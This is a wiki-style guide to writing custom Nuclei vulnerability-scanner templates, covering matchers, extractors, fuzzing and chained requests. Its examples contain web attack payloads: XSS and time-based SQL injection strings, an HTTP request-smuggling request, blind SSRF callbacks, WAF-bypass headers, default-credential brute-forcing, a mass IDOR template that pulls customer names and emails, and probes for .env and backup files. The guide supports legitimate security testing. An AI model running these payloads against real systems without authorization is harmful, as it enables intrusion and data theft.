---
type: wiki
category: tool
tool: nuclei
status: active
last-updated: 2026-04-21
---

# Nuclei Custom Template Writing Guide

> **Purpose:** The official community-templates repo covers generic CVEs / misconfigs. For target-specific or custom vendor bugs, you need to write your own.
> Mastering custom template writing is the key skill that moves you from "script kiddie" to "hunter".

## 0. Basic YAML structure

```yaml
id: my-template-name                    # unique identifier
info:
  name: Target Vendor XYZ Info Disclosure
  author: your-handle
  severity: medium                      # info / low / medium / high / critical
  description: |
    Describe the vulnerability type + detection method
  reference:
    - https://example.com/advisory
    - https://cve.mitre.org/CVE-2026-XXXXX
  classification:
    cve-id: CVE-2026-XXXXX
    cvss-score: 7.5
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cwe-id: CWE-200
  metadata:
    shodan-query: 'http.title:"Target Vendor XYZ"'
    fofa-query: 'title="XYZ Admin Panel"'
  tags: xyz,info-disclosure,2026

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/debug"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "debug_info"
          - "database"
        part: body
```

## 1. Protocol Types

```
http    | HTTP over DNS / general HTTP/S requests
dns     | DNS record lookups
tcp     | raw TCP (port probes / banner grabs)
file    | local file scanning (for scanning source code)
network | alias for tcp
ssl     | SSL cert analysis
code    | execute shell/python scripts
javascript | browser-side JS execution
headless   | Chromium headless browser
whois   | WHOIS lookups
websocket | WebSocket
```

## 2. Matchers explained

### 2.1 `word` (text matching)

```yaml
matchers:
  - type: word
    words:
      - "admin panel"
      - "Server: Apache/2.4.49"
    part: body                # body / header / all / response / interactsh_request
    condition: or             # or / and (default or)
    case-insensitive: true
    negative: false           # true = inverted (this string must NOT appear)
```

### 2.2 `regex`

```yaml
matchers:
  - type: regex
    regex:
      - 'password[\s:=]+["\']?([a-zA-Z0-9]{8,})'
    part: body
```

### 2.3 `status`

```yaml
matchers:
  - type: status
    status:
      - 200
      - 301
      - 302
    negative: false
```

### 2.4 `size`

```yaml
matchers:
  - type: size
    size:
      - 1234
    # Used to lock in an exact byte count, especially when a 404 page has a fixed size
```

### 2.5 `binary` (binary signature)

```yaml
matchers:
  - type: binary
    binary:
      - "504B0304"            # ZIP magic bytes
      - "89504E47"            # PNG
    encoding: hex
```

### 2.6 `dsl` (most powerful, supports expressions)

```yaml
matchers:
  - type: dsl
    dsl:
      - 'status_code == 200 && contains(body, "admin") && !contains(body, "login")'
      - 'len(body) > 1000 && regex("pass[^a-z]", body)'
      - 'duration > 5'        # time-based
```

### 2.7 Combining multiple matchers

```yaml
matchers-condition: and       # all matchers must match
# or
matchers-condition: or        # any one match is enough

matchers:
  - type: status
    status: [200]
  - type: word
    words: ["admin"]
```

## 3. Extractors (pulling out data)

```yaml
extractors:
  - type: regex
    part: body
    regex:
      - 'user_id["\s:=]+(\d+)'
    group: 1                  # capture the 1st capture group

  - type: kval                # key=value header
    kval:
      - server
      - x_powered_by

  - type: json
    json:
      - '.data[].id'          # jq syntax

  - type: xpath
    xpath:
      - '//h1/text()'
    attribute: null

  - type: dsl
    dsl:
      - 'trim(regex_extract("^.*?=(.*)$", body))'
```

Extractor values can be used in subsequent requests (see §5 workflow).

## 4. Payload / Fuzzing Loop

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - ".git/config"
        - ".env"
        - "WEB-INF/web.xml"
        - "config.json"
        - "backup.zip"

    stop-at-first-match: true   # stop after finding 1 match
    threads: 10

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) > 50'
```

### 4.1 Nested payloads

```yaml
payloads:
  user:
    - admin
    - root
    - test
  password:
    - admin
    - password
    - "{{user}}123"           # use a variable defined earlier
```

### 4.2 Reading from a file

```yaml
payloads:
  path: helpers/paths.txt      # path relative to the template
```

### 4.3 Pitchfork / Clusterbomb

```yaml
attack: clusterbomb           # cartesian product (user × password)
# or
attack: pitchfork             # parallel pairing (user[0]:password[0], user[1]:password[1])
# or
attack: batteringram          # all payloads use the same value
```

## 5. Multi-step Workflow (chaining requests)

```yaml
http:
  # Step 1: log in to get a token
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"admin"}

    extractors:
      - type: json
        json:
          - '.token'
        name: auth_token
        internal: true         # internal=true → not shown in output, only used by later steps

  # Step 2: use the token to hit an admin API
  - raw:
      - |
        GET /api/admin/users HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{auth_token}}

    matchers:
      - type: word
        words: ["email"]
        part: body
```

## 6. Raw HTTP (most powerful, can insert any header/body)

```yaml
http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Original-URL: /admin
        User-Agent: Mozilla/5.0

      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"email":"{{email}}","password":"{{pw}}"}

    payloads:
      email: emails.txt
      pw: passwords.txt
    attack: pitchfork

    matchers:
      - type: word
        words: ["token"]
```

## 7. Unsafe HTTP (HTTP/1.1 smuggling / malformed requests)

```yaml
http:
  - raw:
      - |+
        GET /admin HTTP/1.1
        Host: target.com
        Content-Length: 44
        Transfer-Encoding: chunked

        0

        GET /internal HTTP/1.1
        Host: target.com


    unsafe: true              # allow requests that violate the HTTP spec
    matchers:
      - type: word
        words: ["internal"]
```

## 8. DNS / OOB (Blind vulnerability detection)

```yaml
http:
  - method: POST
    path: ["{{BaseURL}}/api/search"]
    body: |
      {"q":"test","callback":"{{interactsh-url}}"}

    matchers:
      - type: word
        part: interactsh_protocol   # dns / http / smtp
        words:
          - "dns"

# interactsh-url is automatically replaced with a unique oast.site hostname
# When the target sends DNS/HTTP traffic → nuclei receives it → match
```

## 9. Time-based (Blind SQLi / delay)

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q='+OR+SLEEP(5)--"

    matchers:
      - type: dsl
        dsl:
          - 'duration >= 5'
```

## 10. Headless (JS execution / DOM XSS)

```yaml
headless:
  - steps:
      - args:
          url: "{{BaseURL}}/search?q=<script>document.title='XSS'</script>"
        action: navigate

      - action: waitload

      - args:
          code: "return document.title"
        action: script
        name: doc_title

    matchers:
      - type: word
        part: doc_title
        words: ["XSS"]
```

## 11. Code Protocol (executing local scripts)

```yaml
code:
  - engine:
      - python3

    source: |
      import sys
      target = sys.argv[1]
      # ... python logic
      print("VULNERABLE")

    matchers:
      - type: word
        words: ["VULNERABLE"]
```

⚠️ Code templates are **disabled by default**. Requires the `-code` flag to enable:

```bash
nuclei -u target.com -t my-code-template.yaml -code
```

## 12. File Protocol (scanning local source)

```yaml
file:
  - extensions:
      - all
      - py
      - js

    extractors:
      - type: regex
        regex:
          - 'AKIA[A-Z0-9]{16}'
        name: aws_key
```

## 13. Variables and Helper Functions

### Common variables

```
{{BaseURL}}       | https://target.com
{{RootURL}}       | https://target.com (no path)
{{Host}}          | target.com:443
{{Hostname}}      | target.com
{{Port}}          | 443
{{Path}}          | /admin
{{File}}          | /admin/test.php
{{randstr}}       | random string
{{rand_int(1,10)}}| random integer
{{md5(value)}}    | MD5
{{interactsh-url}}| OAST URL
```

### Helper Functions

```yaml
# Strings
{{to_lower("ABC")}}                 # abc
{{to_upper("abc")}}                 # ABC
{{trim_prefix("hello world", "hello ")}}  # world
{{regex_extract("[a-z]+", "123abc")}}     # abc
{{replace("hello", "l", "L")}}      # heLLo
{{concat("a","b","c")}}             # abc

# Encoding
{{base64("test")}}                  # dGVzdA==
{{url_encode("a b")}}               # a%20b
{{html_escape("<script>")}}         # &lt;script&gt;
{{hex_encode("abc")}}               # 616263

# Hash
{{md5("test")}}
{{sha1("test")}}
{{sha256("test")}}

# Time
{{unix_time()}}                     # 1736000000
{{date_time("%Y-%m-%d")}}

# JWT
{{generate_jwt('{"sub":"1"}',"HS256","secret")}}

# Random
{{rand_char(5)}}
{{rand_ip()}}
```

## 14. Practical examples

### 14.1 Target-specific info disclosure

```yaml
id: vendor-xyz-debug-exposure
info:
  name: Vendor XYZ Admin Panel Debug Page Exposed
  author: hunter
  severity: high
  tags: xyz,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/internal/debug"
      - "{{BaseURL}}/admin/_debug"
      - "{{BaseURL}}/_console"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "xyz_internal_config"
          - "database_url"
        part: body
      - type: word
        words:
          - "login"
          - "403 Forbidden"
        negative: true

    extractors:
      - type: regex
        part: body
        regex:
          - 'database_url["\s:=]+([^"]+)'
        group: 1
```

### 14.2 Authenticated mass IDOR

```yaml
id: target-idor-shipment
info:
  name: Target.com shipment IDOR
  author: hunter
  severity: critical

http:
  - raw:
      - |
        GET /api/shipment/{{id}} HTTP/1.1
        Host: target.com
        Authorization: Bearer {{auth_token}}

    payloads:
      id:
        - "1"
        - "100"
        - "1000"
        - "99999"

    stop-at-first-match: false
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["customer_name", "tracking_number"]
        part: body

    extractors:
      - type: json
        json:
          - '.customer_name'
          - '.email'
```

Run it:

```bash
nuclei -u https://target.com \
  -t idor.yaml \
  -var auth_token=eyJhbGci...
```

### 14.3 Fuzzing backup files

```yaml
id: backup-scan-deep
info:
  name: Backup File Scan
  author: hunter
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "backup.zip"
        - "backup.tar.gz"
        - "db.sql"
        - "dump.sql"
        - "site.zip"
        - "www.zip"
        - "backup.rar"
        - "backup.7z"
        - "backup.old"
        - "backup.bak"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) > 10000'
          - '!contains(tolower(body), "<html")'
          - '!contains(tolower(body), "not found")'
```

### 14.4 WAF bypass testing

```yaml
id: waf-bypass-test
info:
  name: WAF Bypass Header Test
  author: hunter
  severity: info

http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Original-URL: /admin

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Rewrite-URL: /admin

      - |
        GET /%2e%2e/admin HTTP/1.1
        Host: {{Hostname}}

      - |
        GET //admin HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "admin")'
```

## 15. Debugging & testing

```bash
# Run a single template
nuclei -u https://target.com -t my-template.yaml

# Verbose debug
nuclei -u https://target.com -t my-template.yaml -debug
nuclei -u https://target.com -t my-template.yaml -debug-req
nuclei -u https://target.com -t my-template.yaml -debug-resp

# Validate YAML syntax
nuclei -validate -t my-template.yaml

# Dry-run (no actual requests)
nuclei -u https://target.com -t my-template.yaml -dry-run

# Verbose matcher output
nuclei -u https://target.com -t my-template.yaml -v

# Export JSON
nuclei -u https://target.com -t my-template.yaml -jsonl -o results.json
```

## 16. Best Practice

### ✅ DO

1. **Use AND condition + multiple confirmations in matchers** — avoids false positives
2. **Add a `negative` matcher to exclude 404 / WAF pages** — e.g. `!contains(body, "Access Denied")`
3. **Severity should match reality** — plain exposure is usually info, only classify medium+ when secrets are actually involved
4. **Use `internal: true` for intermediate steps** — keeps output clean
5. **`stop-at-first-match: true` for fuzzing scenarios** — efficiency
6. **Use kebab-case + vendor prefix for `id`** — `vendor-product-cve`

### ❌ DON'T

1. ❌ Only match on `type: status` 200 — every website returns 200
2. ❌ Only match on a single word like `"admin"` — too many false positives
3. ❌ Skip adding `tags` to the template — makes filtering difficult later
4. ❌ Skip `cve-id` / `classification` on a CVE template
5. ❌ Overstate severity (labeling a minor info leak as critical)

## 17. Submitting to community-templates

```bash
# Fork & clone
git clone git@github.com:YOUR_USER/nuclei-templates

# Place it in the right directory
cp my-template.yaml nuclei-templates/http/cves/2026/CVE-2026-XXXXX.yaml

# Lint
nuclei -validate -t CVE-2026-XXXXX.yaml

# The PR template must include:
# - at least 1 public PoC link
# - reference pointing to the advisory
# - metadata (shodan/fofa query)
# - complete matchers (not just a single word)
```

## 18. Practical snippet collection

### 18.1 Reflected XSS (basic)

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<script>alert(1)</script>"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
```

### 18.2 Time-based blind SQLi

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/user?id=1"
      - "{{BaseURL}}/api/user?id=1'+AND+SLEEP(5)--"

    req-condition: true

    matchers:
      - type: dsl
        dsl:
          - 'duration_2-duration_1 >= 5'
```

### 18.3 SSRF blind via OAST

```yaml
http:
  - method: POST
    path: ["{{BaseURL}}/api/webhook"]
    body: '{"url":"http://{{interactsh-url}}"}'

    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http"]
```

## Related documents

- [24-tool-nuclei.md](24-tool-nuclei.md) — basic usage
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) — index of 18 attack template categories
- Nuclei Templates Repo: https://github.com/projectdiscovery/nuclei-templates
- Nuclei Doc: https://docs.projectdiscovery.io/templates/
- Template Examples: https://github.com/projectdiscovery/nuclei-templates/tree/main/http
